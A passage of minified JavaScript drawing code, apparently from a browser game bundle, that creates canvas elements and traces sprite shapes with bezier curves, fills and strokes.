      n.bezierCurveTo(e * 80.5, e * 67.5, e * 80.5, e * 67.5, e * 93, e * 61);
      n.bezierCurveTo(e * 104.5, e * 68, e * 104.5, e * 68, e * 116, e * 75);
      n.bezierCurveTo(e * 120.5, e * 72.5, e * 120.5, e * 72.5, e * 125, e * 70);
      n.bezierCurveTo(e * 129, e * 75, e * 129, e * 75, e * 133, e * 80);
      n.bezierCurveTo(e * 145.5, e * 76.5, e * 145.5, e * 76.5, e * 158, e * 73);
      n.bezierCurveTo(e * 158, e * 87, e * 158, e * 93, e * 155, e * 95);
      n.bezierCurveTo(e * 152.5, e * 96, e * 152.5, e * 96, e * 150, e * 97);
      n.bezierCurveTo(e * 121, e * 85, e * 108, e * 86, e * 93, e * 85);
      n.bezierCurveTo(e * 64, e * 85, e * 52, e * 95, e * 38, e * 99);
      n.bezierCurveTo(e * 36, e * 98.5, e * 36, e * 98.5, e * 34, e * 98);
      n.bezierCurveTo(e * 25, e * 98, e * 27, e * 91, e * 27, e * 76);
      n.closePath();
      ye(n, t[6], t[7], e * 6);
      return r;
    }
    function Si(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 155;
      r.height = e * 127;
      n.globalAlpha = 0.5;
      n.translate(0, e * 8);
      n.translate(e * -7, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 68);
      n.bezierCurveTo(e * 86, e * 64, e * 117, e * 66, e * 134, e * 68);
      n.bezierCurveTo(e * 152, e * 69, e * 165, e * 86, e * 152, e * 104);
      n.bezierCurveTo(e * 146, e * 87, e * 122, e * 89, e * 98, e * 90);
      n.bezierCurveTo(e * 64, e * 89, e * 41, e * 91, e * 36, e * 106);
      n.bezierCurveTo(e * 19, e * 92, e * 31, e * 71, e * 54, e * 69);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -8);
      n.translate(e * 7, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 24, e * 28);
      n.bezierCurveTo(e * 39, e * 30, e * 37, e * 31, e * 40, e * 32);
      n.bezierCurveTo(e * 22, e * 45, e * 26, e * 58, e * 29, e * 66);
      n.bezierCurveTo(e * 86.5, e * 65, e * 86.5, e * 65, e * 144, e * 64);
      n.bezierCurveTo(e * 151, e * 42, e * 132, e * 20, e * 120, e * 16);
      n.bezierCurveTo(e * 106, e * 12, e * 89, e * 0, e * 73, e * 3);
      n.bezierCurveTo(e * 51, e * 5, e * 36, e * 20, e * 25, e * 28);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 41);
      n.bezierCurveTo(e * 49, e * 31, e * 53, e * 29, e * 62, e * 27);
      n.bezierCurveTo(e * 59, e * 24, e * 56, e * 25, e * 53, e * 24);
      n.bezierCurveTo(e * 67, e * 15, e * 84, e * 12, e * 120, e * 16);
      n.bezierCurveTo(e * 107, e * 11, e * 96, e * 6, e * 85, e * 2);
      n.bezierCurveTo(e * 59, e * 3, e * 54, e * 7, e * 40, e * 17);
      n.bezierCurveTo(e * 32.5, e * 22.5, e * 32.5, e * 22.5, e * 25, e * 28);
      n.bezierCurveTo(e * 32, e * 30, e * 32, e * 30, e * 39, e * 32);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 24, e * 28);
      n.bezierCurveTo(e * 39, e * 30, e * 37, e * 31, e * 40, e * 32);
      n.bezierCurveTo(e * 22, e * 45, e * 26, e * 58, e * 29, e * 66);
      n.bezierCurveTo(e * 86.5, e * 65, e * 86.5, e * 65, e * 144, e * 64);
      n.bezierCurveTo(e * 151, e * 42, e * 132, e * 20, e * 120, e * 16);
      n.bezierCurveTo(e * 106, e * 12, e * 89, e * 0, e * 73, e * 3);
      n.bezierCurveTo(e * 51, e * 5, e * 36, e * 20, e * 25, e * 28);
      n.closePath();
      ye(n, undefined, t[2], e * 4);
      ze(n, e * 18, e * 38, e * 14.866068747318506);
      ye(n, t[4], t[5], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39, e * 30);
      n.bezierCurveTo(e * 27, e * 38, e * 25, e * 50, e * 26, e * 60);
      n.bezierCurveTo(e * 36.5, e * 58.5, e * 36.5, e * 58.5, e * 47, e * 57);
      ye(n, t[1], t[2], e * 4);
      n.translate(e * -7, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 68);
      n.bezierCurveTo(e * 86, e * 64, e * 117, e * 66, e * 134, e * 68);
      n.bezierCurveTo(e * 152, e * 69, e * 165, e * 86, e * 152, e * 104);
      n.bezierCurveTo(e * 146, e * 87, e * 122, e * 89, e * 98, e * 90);
      n.bezierCurveTo(e * 64, e * 89, e * 41, e * 91, e * 36, e * 106);
      n.bezierCurveTo(e * 19, e * 92, e * 31, e * 71, e * 54, e * 69);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      return r;
    }
    function pi(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = e * 220;
      var a = e * 220;
      var o = e * 32;
      var s = e * 4;
      t.width = n;
      t.height = a;
      r.translate(n / 2, a / 2 + e * 10);
      r.globalAlpha = 0.5;
      ze(r, 0, 0, o);
      ye(r, i[0], i[0]);
      r.translate(0, e * -8);
      r.globalAlpha = 1;
      ze(r, 0, 0, o);
      ye(r, i[1], i[2], s);
      return t;
    }
    function mi(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = e * 40;
      var a = e * 40;
      var o = e * 16;
      var s = e * 4;
      t.width = n;
      t.height = a;
      r.translate(n / 2, a / 2);
      r.globalAlpha = 1;
      ze(r, 0, 0, o);
      ye(r, i[0], i[1], s);
      return t;
    }
    function vi(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = e * 220;
      var a = e * 220;
      var o = e * 16;
      t.width = n;
      t.height = a;
      r.translate(n / 2, a / 2);
      r.globalAlpha = 0.5;
      ze(r, 0, 0, o);
      ye(r, i[0]);
      r.globalAlpha = 1;
      return t;
    }
    function Mi(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      var o = e * 210;
      var s = e * 205;
      var _ = e * 30;
      var E = e * 20;
      var T = e * 200;
      var A = e * 180;
      var d = T / 2;
      var h = A / 2;
      n.width = o;
      n.height = s;
      n.width = e * 419;
      n.height = e * 412;
      if (r == 1) {
        a.save();
        a.translate(e * 10, e * 0);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 117.99996948242188, e * 216.40621948242188);
        a.bezierCurveTo(e * 86.99996948242188, e * 221.40621948242188, e * 74.99996948242188, e * 217.40621948242188, e * 60.999969482421875, e * 205.40621948242188);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 114.99996948242188, e * 227.40621948242188);
        a.bezierCurveTo(e * 90.99996948242188, e * 233.40621948242188, e * 66.99996948242188, e * 228.40621948242188, e * 43.999969482421875, e * 225.40621948242188);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 110.99996948242188, e * 236.40621948242188);
        a.bezierCurveTo(e * 94.99996948242188, e * 244.40621948242188, e * 79.99996948242188, e * 249.40621948242188, e * 60.999969482421875, e * 249.40621948242188);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 111.99996948242188, e * 206.29513549804688);
        a.bezierCurveTo(e * 91.99996948242188, e * 206.29513549804688, e * 87.99996948242188, e * 201.29513549804688, e * 79.99996948242188, e * 192.29513549804688);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 109.99996948242188, e * 249.18402099609375);
        a.bezierCurveTo(e * 97.99996948242188, e * 263.18402099609375, e * 85.99996948242188, e * 271.18402099609375, e * 65.99996948242188, e * 277.18402099609375);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 105.99996948242188, e * 192.18402099609375);
        a.bezierCurveTo(e * 99.49996948242188, e * 197.68402099609375, e * 99.49996948242188, e * 197.68402099609375, e * 92.99996948242188, e * 203.18402099609375);
        a.bezierCurveTo(e * 95.99996948242188, e * 213.18402099609375, e * 95.99996948242188, e * 215.18402099609375, e * 89.99996948242188, e * 219.18402099609375);
        a.bezierCurveTo(e * 91.99996948242188, e * 223.18402099609375, e * 91.99996948242188, e * 226.18402099609375, e * 87.99996948242188, e * 230.18402099609375);
        a.bezierCurveTo(e * 89.99996948242188, e * 234.18402099609375, e * 91.99996948242188, e * 237.18402099609375, e * 90.99996948242188, e * 244.18402099609375);
        a.bezierCurveTo(e * 96.99996948242188, e * 252.18402099609375, e * 96.99996948242188, e * 256.18402099609375, e * 95.99996948242188, e * 262.18402099609375);
        a.bezierCurveTo(e * 106.49996948242188, e * 264.18402099609375, e * 106.49996948242188, e * 264.18402099609375, e * 116.99996948242188, e * 266.18402099609375);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 104.99996948242188, e * 183.29513549804688);
        a.bezierCurveTo(e * 99.99996948242188, e * 193.29513549804688, e * 93.99996948242188, e * 195.29513549804688, e * 89.99996948242188, e * 201.29513549804688);
        a.bezierCurveTo(e * 86.99996948242188, e * 212.29513549804688, e * 85.99996948242188, e * 214.29513549804688, e * 81.99996948242188, e * 215.29513549804688);
        a.bezierCurveTo(e * 83.99996948242188, e * 223.29513549804688, e * 83.99996948242188, e * 227.29513549804688, e * 79.99996948242188, e * 230.29513549804688);
        a.bezierCurveTo(e * 83.99996948242188, e * 235.29513549804688, e * 84.99996948242188, e * 240.29513549804688, e * 79.99996948242188, e * 246.29513549804688);
        a.bezierCurveTo(e * 86.99996948242188, e * 251.29513549804688, e * 91.99996948242188, e * 256.2951354980469, e * 89.99996948242188, e * 266.2951354980469);
        a.bezierCurveTo(e * 102.99996948242188, e * 269.2951354980469, e * 102.99996948242188, e * 269.2951354980469, e * 115.99996948242188, e * 272.2951354980469);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 107.99996948242188, e * 177.85067749023438);
        a.bezierCurveTo(e * 95.99996948242188, e * 187.35067749023438, e * 95.99996948242188, e * 187.35067749023438, e * 83.99996948242188, e * 196.85067749023438);
        a.bezierCurveTo(e * 82.99996948242188, e * 203.85067749023438, e * 80.99996948242188, e * 209.85067749023438, e * 72.99996948242188, e * 210.85067749023438);
        a.bezierCurveTo(e * 73.99996948242188, e * 220.85067749023438, e * 73.99996948242188, e * 221.85067749023438, e * 66.99996948242188, e * 227.85067749023438);
        a.bezierCurveTo(e * 71.99996948242188, e * 235.85067749023438, e * 73.99996948242188, e * 239.85067749023438, e * 71.99996948242188, e * 247.85067749023438);
        a.bezierCurveTo(e * 80.99996948242188, e * 257.8506774902344, e * 81.99996948242188, e * 263.8506774902344, e * 77.99996948242188, e * 271.8506774902344);
        a.bezierCurveTo(e * 95.49996948242188, e * 272.8506774902344, e * 95.49996948242188, e * 272.8506774902344, e * 112.99996948242188, e * 273.8506774902344);
        ye(a, undefined, i[4], e * 3);
        a.restore();
      } else if (r == 2) {
        a.save();
        a.translate(e * 130, e * 35);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 170.99996948242188, e * 133.85067749023438);
        a.bezierCurveTo(e * 195.99996948242188, e * 129.85067749023438, e * 196.99996948242188, e * 111.85067749023438, e * 200.99996948242188, e * 88.85067749023438);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 169.99996948242188, e * 143.85067749023438);
        a.bezierCurveTo(e * 189.99996948242188, e * 145.85067749023438, e * 207.99996948242188, e * 126.85067749023438, e * 222.99996948242188, e * 100.85067749023438);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 170.99996948242188, e * 157.85067749023438);
        a.bezierCurveTo(e * 193.99996948242188, e * 160.85067749023438, e * 210.99996948242188, e * 151.85067749023438, e * 232.99996948242188, e * 139.85067749023438);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 169.99996948242188, e * 168.85067749023438);
        a.bezierCurveTo(e * 192.99996948242188, e * 175.85067749023438, e * 203.99996948242188, e * 177.85067749023438, e * 245.99996948242188, e * 168.85067749023438);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 167.99996948242188, e * 168.85067749023438);
        a.bezierCurveTo(e * 183.99996948242188, e * 189.85067749023438, e * 191.99996948242188, e * 193.85067749023438, e * 220.99996948242188, e * 196.85067749023438);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 176.99996948242188, e * 117.85067749023438);
        a.bezierCurveTo(e * 181.99996948242188, e * 120.85067749023438, e * 181.99996948242188, e * 120.85067749023438, e * 186.99996948242188, e * 123.85067749023438);
        a.bezierCurveTo(e * 183.99996948242188, e * 137.85067749023438, e * 185.99996948242188, e * 136.85067749023438, e * 190.99996948242188, e * 136.85067749023438);
        a.bezierCurveTo(e * 186.99996948242188, e * 147.85067749023438, e * 189.99996948242188, e * 152.85067749023438, e * 193.99996948242188, e * 155.85067749023438);
        a.bezierCurveTo(e * 187.99996948242188, e * 165.85067749023438, e * 190.99996948242188, e * 169.85067749023438, e * 190.99996948242188, e * 172.85067749023438);
        a.bezierCurveTo(e * 186.99996948242188, e * 183.85067749023438, e * 186.99996948242188, e * 185.85067749023438, e * 189.99996948242188, e * 188.85067749023438);
        a.bezierCurveTo(e * 182.49996948242188, e * 195.35067749023438, e * 182.49996948242188, e * 195.35067749023438, e * 174.99996948242188, e * 201.85067749023438);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 176.99996948242188, e * 112.18402099609375);
        a.bezierCurveTo(e * 183.99996948242188, e * 119.18402099609375, e * 186.99996948242188, e * 117.18402099609375, e * 192.99996948242188, e * 116.18402099609375);
        a.bezierCurveTo(e * 191.99996948242188, e * 126.18402099609375, e * 193.99996948242188, e * 130.18402099609375, e * 199.99996948242188, e * 130.18402099609375);
        a.bezierCurveTo(e * 194.99996948242188, e * 145.18402099609375, e * 197.99996948242188, e * 147.18402099609375, e * 201.99996948242188, e * 153.18402099609375);
        a.bezierCurveTo(e * 196.99996948242188, e * 164.18402099609375, e * 197.99996948242188, e * 169.18402099609375, e * 201.99996948242188, e * 174.18402099609375);
        a.bezierCurveTo(e * 194.99996948242188, e * 184.18402099609375, e * 196.99996948242188, e * 187.18402099609375, e * 200.99996948242188, e * 193.18402099609375);
        a.bezierCurveTo(e * 185.99996948242188, e * 195.18402099609375, e * 181.99996948242188, e * 201.18402099609375, e * 174.99996948242188, e * 210.18402099609375);
        ye(a, undefined, i[4], e * 3);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 176.99996948242188, e * 101.29513549804688);
        a.bezierCurveTo(e * 181.99996948242188, e * 108.29513549804688, e * 189.99996948242188, e * 110.29513549804688, e * 195.99996948242188, e * 107.29513549804688);
        a.bezierCurveTo(e * 197.99996948242188, e * 121.29513549804688, e * 200.99996948242188, e * 122.29513549804688, e * 206.99996948242188, e * 122.29513549804688);
        a.bezierCurveTo(e * 201.99996948242188, e * 138.29513549804688, e * 204.99996948242188, e * 142.29513549804688, e * 211.99996948242188, e * 148.29513549804688);
        a.bezierCurveTo(e * 201.99996948242188, e * 156.29513549804688, e * 205.99996948242188, e * 167.29513549804688, e * 213.99996948242188, e * 173.29513549804688);
        a.bezierCurveTo(e * 204.99996948242188, e * 181.29513549804688, e * 204.99996948242188, e * 187.29513549804688, e * 205.99996948242188, e * 193.29513549804688);
        a.bezierCurveTo(e * 190.99996948242188, e * 198.29513549804688, e * 181.99996948242188, e * 205.29513549804688, e * 174.99996948242188, e * 214.29513549804688);
        ye(a, undefined, i[4], e * 3);
        a.restore();
      }
      a.translate(n.width / 2, n.height / 2);
      if (!r) {
        a.globalAlpha = 0.5;
        Be(a, -d, -h, T, A + E, _);
        ye(a, i[0]);
        if (t) {
          a.rotate(Math.PI);
        }
        a.globalAlpha = 1;
        Be(a, -d, -h, T, A, _);
        ye(a, i[1], i[2], 4);
        a.globalAlpha = 1;
        Be(a, e * 35 - d, e * 20 - h, T - e * 50, A - e * 50, _ - e * 10);
        ye(a, i[3]);
      }
      if (r == 3) {
        a.translate(-n.width / 2, -n.height / 2);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 121, e * 190);
        a.bezierCurveTo(e * 129, e * 186, e * 137, e * 183, e * 135, e * 163);
        a.bezierCurveTo(e * 131, e * 135, e * 153, e * 127, e * 177, e * 124);
        a.bezierCurveTo(e * 198, e * 120, e * 208, e * 122, e * 226, e * 128);
        a.bezierCurveTo(e * 261, e * 112, e * 271, e * 126, e * 287, e * 147);
        a.bezierCurveTo(e * 310, e * 163, e * 304, e * 183, e * 283, e * 196);
        a.bezierCurveTo(e * 296, e * 249, e * 278, e * 262, e * 253, e * 263);
        a.bezierCurveTo(e * 210, e * 264, e * 188, e * 252, e * 177, e * 234);
        a.bezierCurveTo(e * 133, e * 242, e * 123, e * 241, e * 115, e * 225);
        a.bezierCurveTo(e * 109, e * 206, e * 115, e * 193, e * 121, e * 190);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 219, e * 144);
        a.bezierCurveTo(e * 251, e * 121, e * 277, e * 136, e * 276, e * 159);
        a.bezierCurveTo(e * 276, e * 176, e * 273, e * 191, e * 242, e * 193);
        a.bezierCurveTo(e * 226, e * 228, e * 155, e * 219, e * 150, e * 183);
        a.bezierCurveTo(e * 142, e * 144, e * 174, e * 127, e * 219, e * 144);
        a.closePath();
        ye(a, i[5]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 123, e * 214);
        a.bezierCurveTo(e * 119, e * 198, e * 129, e * 189, e * 146, e * 194);
        a.bezierCurveTo(e * 158, e * 201, e * 165, e * 218, e * 147, e * 226);
        a.bezierCurveTo(e * 135, e * 230, e * 125, e * 222, e * 123, e * 214);
        a.closePath();
        ye(a, i[5]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 257, e * 199);
        a.bezierCurveTo(e * 264, e * 199, e * 275, e * 213, e * 261, e * 220);
        a.bezierCurveTo(e * 246, e * 225, e * 235, e * 200, e * 257, e * 199);
        a.closePath();
        ye(a, i[5]);
        a.translate(e * -5, e * 55);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 186, e * 123);
        a.bezierCurveTo(e * 198, e * 115, e * 219, e * 110, e * 219, e * 123);
        a.bezierCurveTo(e * 216, e * 135, e * 171, e * 143, e * 186, e * 123);
        a.closePath();
        ye(a, i[5]);
        a.translate(e * 5, e * -55);
        a.translate(e * -5, e * 15);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 171, e * 241);
        a.bezierCurveTo(e * 189, e * 234, e * 200, e * 248, e * 189, e * 254);
        a.bezierCurveTo(e * 179, e * 260, e * 158, e * 246, e * 171, e * 241);
        a.closePath();
        ye(a, i[5]);
      } else if (r == 4) {
        a.translate(-n.width / 2, -n.height / 2);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 30, e * 167);
        a.bezierCurveTo(e * 47, e * 144, e * 64, e * 140, e * 80, e * 147);
        a.bezierCurveTo(e * 95, e * 154, e * 95, e * 159, e * 100, e * 179);
        a.bezierCurveTo(e * 105, e * 202, e * 95, e * 218, e * 69, e * 218);
        a.bezierCurveTo(e * 48, e * 236, e * 26, e * 223, e * 28, e * 213);
        a.bezierCurveTo(e * 28, e * 205, e * 29, e * 199, e * 32, e * 195);
        a.bezierCurveTo(e * 21, e * 183, e * 27, e * 173, e * 30, e * 167);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 26, e * 145);
        a.bezierCurveTo(e * 32, e * 138, e * 37, e * 137, e * 40, e * 139);
        a.bezierCurveTo(e * 43, e * 140, e * 41, e * 150, e * 31, e * 159);
        a.bezierCurveTo(e * 23, e * 166, e * 17, e * 158, e * 26, e * 145);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 13, e * 193);
        a.bezierCurveTo(e * 21, e * 187, e * 30, e * 190, e * 20, e * 202);
        a.bezierCurveTo(e * 13, e * 208, e * 7, e * 202, e * 13, e * 193);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 121, e * 190);
        a.bezierCurveTo(e * 129, e * 186, e * 137, e * 183, e * 135, e * 163);
        a.bezierCurveTo(e * 131, e * 135, e * 153, e * 127, e * 177, e * 124);
        a.bezierCurveTo(e * 198, e * 120, e * 208, e * 122, e * 226, e * 128);
        a.bezierCurveTo(e * 261, e * 112, e * 271, e * 126, e * 287, e * 147);
        a.bezierCurveTo(e * 310, e * 163, e * 304, e * 183, e * 283, e * 196);
        a.bezierCurveTo(e * 296, e * 249, e * 278, e * 262, e * 253, e * 263);
        a.bezierCurveTo(e * 210, e * 264, e * 188, e * 252, e * 177, e * 234);
        a.bezierCurveTo(e * 133, e * 242, e * 123, e * 241, e * 115, e * 225);
        a.bezierCurveTo(e * 109, e * 206, e * 115, e * 193, e * 121, e * 190);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 335, e * 196);
        a.bezierCurveTo(e * 312, e * 208, e * 300, e * 185, e * 309, e * 167);
        a.bezierCurveTo(e * 314, e * 141, e * 339, e * 127, e * 359, e * 144);
        a.bezierCurveTo(e * 363, e * 148, e * 364, e * 150, e * 364, e * 150);
        a.bezierCurveTo(e * 392, e * 143, e * 396, e * 183, e * 378, e * 204);
        a.bezierCurveTo(e * 367, e * 215, e * 339, e * 208, e * 335, e * 196);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 349, e * 212);
        a.bezierCurveTo(e * 339, e * 216, e * 334, e * 208, e * 341, e * 203);
        a.bezierCurveTo(e * 353, e * 198, e * 361, e * 205, e * 349, e * 212);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 46, e * 165);
        a.bezierCurveTo(e * 55, e * 148, e * 85, e * 157, e * 83, e * 175);
        a.bezierCurveTo(e * 99, e * 185, e * 89, e * 212, e * 66, e * 204);
        a.bezierCurveTo(e * 55, e * 212, e * 43, e * 212, e * 41, e * 202);
        a.bezierCurveTo(e * 39, e * 194, e * 42, e * 187, e * 49, e * 185);
        a.bezierCurveTo(e * 44, e * 175, e * 45, e * 172, e * 46, e * 165);
        a.closePath();
        ye(a, i[4]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 219, e * 144);
        a.bezierCurveTo(e * 251, e * 121, e * 277, e * 136, e * 276, e * 159);
        a.bezierCurveTo(e * 276, e * 176, e * 273, e * 191, e * 242, e * 193);
        a.bezierCurveTo(e * 226, e * 228, e * 155, e * 219, e * 150, e * 183);
        a.bezierCurveTo(e * 142, e * 144, e * 174, e * 127, e * 219, e * 144);
        a.closePath();
        ye(a, i[5]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 123, e * 214);
        a.bezierCurveTo(e * 119, e * 198, e * 129, e * 189, e * 146, e * 194);
        a.bezierCurveTo(e * 158, e * 201, e * 165, e * 218, e * 147, e * 226);
        a.bezierCurveTo(e * 135, e * 230, e * 125, e * 222, e * 123, e * 214);
        a.closePath();
        ye(a, i[5]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 257, e * 199);
        a.bezierCurveTo(e * 264, e * 199, e * 275, e * 213, e * 261, e * 220);
        a.bezierCurveTo(e * 246, e * 225, e * 235, e * 200, e * 257, e * 199);
        a.closePath();
        ye(a, i[5]);
        a.translate(e * -5, e * 55);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 186, e * 123);
        a.bezierCurveTo(e * 198, e * 115, e * 219, e * 110, e * 219, e * 123);
        a.bezierCurveTo(e * 216, e * 135, e * 171, e * 143, e * 186, e * 123);
        a.closePath();
        ye(a, i[5]);
        a.translate(e * 5, e * -55);
        a.translate(e * -5, e * 15);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 171, e * 241);
        a.bezierCurveTo(e * 189, e * 234, e * 200, e * 248, e * 189, e * 254);
        a.bezierCurveTo(e * 179, e * 260, e * 158, e * 246, e * 171, e * 241);
        a.closePath();
        ye(a, i[5]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 367, e * 164);
        a.bezierCurveTo(e * 380, e * 160, e * 391, e * 185, e * 371, e * 189);
        a.bezierCurveTo(e * 362, e * 192, e * 354, e * 191, e * 350, e * 185);
        a.bezierCurveTo(e * 326, e * 205, e * 314, e * 182, e * 316, e * 171);
        a.bezierCurveTo(e * 317, e * 150, e * 332, e * 143, e * 347, e * 147);
        a.bezierCurveTo(e * 361, e * 151, e * 366, e * 158, e * 367, e * 164);
        a.closePath();
        ye(a, i[4]);
      }
      return n;
    }
    function Li(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      n.width = e * 121;
      n.height = e * 130;
      a.translate(0, e * 20);
      if (t == 1) {
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 6, e * 23);
        a.bezierCurveTo(e * 6, e * 46, e * 6, e * 46, e * 6, e * 69);
        a.bezierCurveTo(e * 21, e * 69, e * 21, e * 69, e * 36, e * 69);
        a.bezierCurveTo(e * 45.5, e * 78.5, e * 45.5, e * 78.5, e * 55, e * 88);
        a.bezierCurveTo(e * 55.5, e * 45.5, e * 55.5, e * 45.5, e * 56, e * 3);
        a.bezierCurveTo(e * 47, e * 14, e * 47, e * 14, e * 38, e * 25);
        a.bezierCurveTo(e * 23, e * 25, e * 23, e * 25, e * 6, e * 23);
        a.closePath();
        ye(a, undefined, i[3], e * 13);
      }
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 6, e * 23);
      a.bezierCurveTo(e * 6, e * 46, e * 6, e * 46, e * 6, e * 69);
      a.bezierCurveTo(e * 21, e * 69, e * 21, e * 69, e * 36, e * 69);
      a.bezierCurveTo(e * 45.5, e * 78.5, e * 45.5, e * 78.5, e * 55, e * 88);
      a.bezierCurveTo(e * 55.5, e * 45.5, e * 55.5, e * 45.5, e * 56, e * 3);
      a.bezierCurveTo(e * 47, e * 14, e * 47, e * 14, e * 38, e * 25);
      a.bezierCurveTo(e * 23, e * 25, e * 23, e * 25, e * 6, e * 23);
      a.closePath();
      ye(a, i[1], i[2], e * 4);
      if (r == 1) {
        a.translate(0, e * 5);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 67, e * 30);
        a.bezierCurveTo(e * 73, e * 47, e * 69, e * 45, e * 67, e * 58);
        ye(a, undefined, i[0], e * 10);
        a.translate(3, e * 0);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 70, e * 17);
        a.bezierCurveTo(e * 83, e * 45, e * 76, e * 55, e * 70, e * 69);
        ye(a, undefined, i[0], e * 10);
        a.translate(3, e * 0);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 76, e * 8);
        a.bezierCurveTo(e * 88, e * 31, e * 89, e * 55, e * 76, e * 79);
        ye(a, undefined, i[0], e * 10);
        if (t == 1) {
          a.translate(e * -6, e * -5);
          a.beginPath();
          a.lineCap = "round";
          a.lineJoin = "round";
          a.moveTo(e * 67, e * 30);
          a.bezierCurveTo(e * 73, e * 47, e * 69, e * 45, e * 67, e * 58);
          ye(a, undefined, i[3], e * 18);
          a.translate(3, e * 0);
          a.beginPath();
          a.lineCap = "round";
          a.lineJoin = "round";
          a.moveTo(e * 70, e * 17);
          a.bezierCurveTo(e * 83, e * 45, e * 76, e * 55, e * 70, e * 69);
          ye(a, undefined, i[3], e * 18);
          a.translate(3, e * 0);
          a.beginPath();
          a.lineCap = "round";
          a.lineJoin = "round";
          a.moveTo(e * 76, e * 8);
          a.bezierCurveTo(e * 88, e * 31, e * 89, e * 55, e * 76, e * 79);
          ye(a, undefined, i[3], e * 18);
          a.translate(-6, e * 0);
        } else {
          a.translate(e * -6, e * -5);
        }
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 67, e * 30);
